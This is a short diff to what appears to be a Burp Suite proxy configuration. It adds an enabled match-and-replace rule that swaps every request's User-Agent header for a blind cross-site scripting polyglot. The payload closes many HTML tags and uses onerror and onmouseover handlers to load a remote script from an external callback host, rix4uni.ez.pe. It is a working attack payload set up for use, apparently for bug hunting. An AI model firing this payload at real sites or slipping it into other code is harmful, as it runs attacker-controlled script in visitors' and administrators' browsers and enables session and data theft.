@@ -2,6 +2,14 @@
     "proxy":{
         "match_replace_rules":[
             {
+                "comment":"Finding XSS on User-Agent Favourite Payload1",
+                "enabled":true,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^User-Agent.*$",
+                "string_replace":"User-Agent: '\"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'></marquee> ></plaintext\\></|\\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'>"
+            },
+            {
                 "comment":"Finding XSS on User-Agent Payload1",
                 "enabled":false,
                 "is_simple_match":false,
